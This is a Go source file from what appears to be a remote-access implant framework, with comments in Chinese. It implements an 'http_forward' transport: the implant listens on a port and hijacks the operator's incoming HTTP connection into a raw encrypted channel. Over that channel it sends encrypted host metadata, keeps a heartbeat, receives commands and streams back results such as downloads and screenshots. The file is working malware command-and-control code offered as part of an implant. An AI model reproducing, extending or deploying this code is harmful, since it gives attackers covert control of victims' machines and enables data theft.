//go:build transport_http_forward || transport_multi

package main

import (
	"bufio"
	"fmt"
	"implant/core/app"
	"implant/core/communication"
	"implant/core/debuglog"
	"implant/core/encrypt"
	"implant/core/reconnect"
	"implant/core/utils"
	"net"
	"net/http"
	"sync"
	"time"
)

// NewTransport 构造 http_forward 传输（单二进制 build tag 入口）
// init 注册到运行时传输表（多传输构建下按 scheme 选择；单传输构建下只有自己）
func init() {
	registerTransport("http_forward", newHTTPForwardTransport)
	listenerType = "http_forward"
}

func newHTTPForwardTransport() transportClient {
	return &HTTPForwardClient{reconnectMgr: reconnect.NewReconnectManager()}
}

// connected 当前是否已连接
func (c *HTTPForwardClient) IsConnected() bool { return c.connected }

// ReconnectMgr 返回重连管理器
func (c *HTTPForwardClient) ReconnectMgr() *reconnect.ReconnectManager { return c.reconnectMgr }

type HTTPForwardClient struct {
	Listener     net.Listener
	Server       *http.Server
	Connection   net.Conn
	reader       *bufio.Reader
	reconnectMgr *reconnect.ReconnectManager
	connected    bool
	stopCh       chan struct{}
	connectedCh  chan error
	sendMutex    sync.Mutex // 串行化所有写路径（心跳/结果/FirstBlood），防帧交错
}

func (c *HTTPForwardClient) fail() {
	c.connected = false
	if c.reconnectMgr != nil {
		c.reconnectMgr.OnReconnectFailed()
	}
}

// Connect 在 spec（listenAddr:port）上启动 HTTP 服务，等待服务端拨号并 Hijack 成原始连接，
// 然后 FirstBlood + 会话密钥 + 心跳。阻塞直到有服务端连入或出错。
func (c *HTTPForwardClient) Connect(spec string) error {
	if c.reconnectMgr != nil {
		c.reconnectMgr.OnReconnectAttempt()
	}
	// 【重连修复】关闭旧监听器/HTTP服务/旧连接：fail() 只清理连接，runLoop 重连时
	// 旧 Listener 仍占用端口 → net.Listen EADDRINUSE 永久失败
	if c.Connection != nil {
		c.Connection.Close()
		c.Connection = nil
	}
	if c.Server != nil {
		c.Server.Close()
		c.Server = nil
	}
	if c.Listener != nil {
		c.Listener.Close()
		c.Listener = nil
	}
	c.connectedCh = make(chan error, 1)

	mux := http.NewServeMux()
	mux.HandleFunc("/", c.handleConn)
	mux.HandleFunc("/favicon.ico", func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusNotFound)
	})

	ln, err := net.Listen("tcp", spec)
	if err != nil {
		c.fail()
		return err
	}
	c.Listener = ln
	c.Server = &http.Server{
		Handler:           mux,
		ReadHeaderTimeout: 15 * time.Second,
	}
	go func() {
		if err := c.Server.Serve(ln); err != nil && err != http.ErrServerClosed {
			debuglog.Printf("❌ [HTTP-FORWARD] HTTP 服务退出: %v\n", err)
		}
	}()
	debuglog.Printf("✅ [HTTP-FORWARD] 监听 %s，等待服务端连接...\n", spec)

	// 阻塞等待服务端拨号（与 TCP/KCP/WS 正向 Accept 语义一致）
	err = <-c.connectedCh
	if err != nil {
		c.fail()
		return err
	}
	return nil
}

// handleConn 服务端拨号后的 HTTP handler：Hijack 连接并转为原始协议流
func (c *HTTPForwardClient) handleConn(w http.ResponseWriter, r *http.Request) {
	hj, ok := w.(http.Hijacker)
	if !ok {
		http.Error(w, "hijack unsupported", http.StatusInternalServerError)
		select {
		case c.connectedCh <- fmt.Errorf("hijack unsupported"):
		default:
		}
		return
	}
	conn, buf, err := hj.Hijack()
	if err != nil {
		select {
		case c.connectedCh <- err:
		default:
		}
		return
	}
	// 返回 HTTP 200 完成握手，此后连接转为原始协议流
	if _, err := conn.Write([]byte("HTTP/1.1 200 OK\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")); err != nil {
		conn.Close()
		select {
		case c.connectedCh <- err:
		default:
		}
		return
	}
	c.Connection = conn
	c.reader = buf.Reader
	c.connected = true
	debuglog.Printf("✅ [HTTP-FORWARD] 服务端连入: %s\n", conn.RemoteAddr())

	// MetaInfo + FirstBlood
	if len(utils.MetaInfo) == 0 {
		metaRaw, metaErr := utils.EncryptedMetaInfo()
		if metaErr != nil {
			c.fail()
			select {
			case c.connectedCh <- metaErr:
			default:
			}
			return
		}
		metaB64, metaErr2 := encrypt.EncodeBase64(metaRaw)
		if metaErr2 != nil {
			c.fail()
			select {
			case c.connectedCh <- metaErr2:
			default:
			}
			return
		}
		utils.MetaInfo = metaB64
	}
	if err := c.rawSend(utils.BytesCombine(utils.WriteInt(1), utils.MetaInfo)); err != nil {
		select {
		case c.connectedCh <- err:
		default:
		}
		return
	}

	// 会话密钥（http_forward 用占位符 key，与服务端 http_forward 分支一致）
	salt, masterKey := app.GetListenerKeyConfig("http_forward")
	if err := encrypt.GlobalClientKeyManager.SetSessionKeyPreferringKX(salt[:16], masterKey[:32]); err != nil {
		select {
		case c.connectedCh <- err:
		default:
		}
		return
	}
	if c.reconnectMgr != nil {
		c.reconnectMgr.OnReconnectSuccess()
	}

	// 心跳：重连时先停旧心跳循环 + 关旧 stopCh，防 goroutine 随重连堆积
	if c.stopCh != nil {
		close(c.stopCh)
	}
	c.stopCh = make(chan struct{})
	stop := c.stopCh
	go app.HeartbeatLoop(stop, c.keepAlive)

	select {
	case c.connectedCh <- nil:
	default:
	}
}

// Recv 读取一条命令：4字节长度 + 载荷 + base64 + 解密。
func (c *HTTPForwardClient) Recv() ([]byte, error) {
	if c.Connection == nil || !c.connected {
		c.fail()
		return nil, fmt.Errorf("未连接")
	}
	// 读超时：服务端每心跳回复 ack，健康连接不会超时；超时说明服务端半开/死亡，触发重连
	if err := c.Connection.SetReadDeadline(time.Now().Add(app.RecvDeadline())); err != nil {
		c.fail()
		return nil, err
	}
	// 【P2-5】共享帧管线：长度前缀 + 上限校验（K3，原缺失 OOM 洞）+ 载荷读取 + 解码
	total, err := communication.ReadFramedLength(c.reader)
	if err != nil {
		c.fail()
		return nil, err
	}
	if total == 0 {
		return nil, nil
	}
	if total > 1<<20 {
		// 大消息（下载/截图等）：按传输速率放宽读超时，避免慢链路误判超时
		c.Connection.SetReadDeadline(time.Now().Add(app.RecvDeadline() + time.Duration(total/50_000)*time.Second))
	}
	payload, err := communication.ReadFramedPayload(c.reader, total)
	if err != nil {
		c.fail()
		return nil, err
	}
	return communication.DecodeFramePayload(payload)
}

// SendResult 按 TCP 协议分帧回送：normalData(2) | MetaLen | MetaInfo | b64Packet，再分块写。
func (c *HTTPForwardClient) SendResult(b64Packet []byte) error {
	msgToSend := utils.BytesCombine(utils.WriteInt(2), communication.FrameResult(b64Packet))
	return c.rawSend(msgToSend)
}

func (c *HTTPForwardClient) rawSend(msg []byte) error {
	c.sendMutex.Lock()
	defer c.sendMutex.Unlock()
	defer func() {
		if r := recover(); r != nil {
			debuglog.Printf("[SEND-PANIC] %v\n", r)
		}
	}()
	if c.Connection == nil {
		return fmt.Errorf("连接为空")
	}
	msgToSend := utils.BytesCombine(utils.WriteInt(len(msg)), msg)
	// 【P2-5】共享分块写（50KB/块）
	if err := communication.WriteChunked(c.Connection, msgToSend); err != nil {
		c.fail()
		return err
	}
	return nil
}

func (c *HTTPForwardClient) keepAlive() {
	c.rawSend(communication.HeartbeatMsg())
}

func (c *HTTPForwardClient) Close() error {
	if c.stopCh != nil {
		close(c.stopCh)
		c.stopCh = nil
	}
	if c.Connection != nil {
		c.Connection.Close()
		c.Connection = nil
	}
	if c.Server != nil {
		c.Server.Close()
		c.Server = nil
	}
	if c.Listener != nil {
		c.Listener.Close()
		c.Listener = nil
	}
	return nil
}
